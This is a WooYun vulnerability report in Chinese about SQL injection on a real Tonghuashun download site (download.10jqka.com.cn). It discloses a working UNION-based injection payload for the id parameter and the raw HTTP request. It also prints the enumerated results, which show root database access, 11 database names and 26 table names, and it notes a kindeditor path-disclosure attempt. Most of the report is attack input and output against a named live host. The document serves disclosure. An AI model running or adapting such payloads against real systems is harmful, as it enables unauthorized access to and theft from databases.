wybug_title: 同花顺又一站点MySQL注射(可union)
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-05-11：	细节已通知厂商并且等待厂商处理中									2015-05-16：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 同花顺又一站点MySQL注射, 可union, root用户 详细说明：  注射点：
GET /index/download?id=* HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://download.10jqka.com.cnHost: download.10jqka.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4Accept: */*
参数id可注入，可union查询, root用户。
Type: UNION query    Title: Generic UNION query (NULL) - 26 columns    Payload: http://download.10jqka.com.cn:80/index/download?id=-6826' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a766a71,0x727456774c564849424e,0x7171717171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
   漏洞证明：  
current user:    'root@192.168.0.58'current database:    'download'available databases [11]:[*] concept[*] dispatcher[*] download[*] flashcms[*] guochengxin[*] information_schema[*] monitor[*] mysql[*] performance_schema[*] push[*] weixinDatabase: download[26 tables]+-------------------------+| authorization           || user                    || cooperationSoftware     || cooperationSoftware_tmp || downloadAddress         || downloadAddress_tmp     || downloadCount           || downloadIPAddress       || imageAdv                || imageAdv_tmp            || indexBlock              || indexBlock_tmp          || indexfocus              || logcategory             || operation_record        || platform                || productlog              || recommendation          || series                  || software                || software_bak            || software_tmp            || textAdTitle             || textAdTitle_tmp         || textLink                || textLink_tmp            |+-------------------------+
试了下利用kindeditor爆路径，但是发现文件不存在：
http://download.10jqka.com.cn/kindeditor/php/file_manager_json.php?path=/
   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
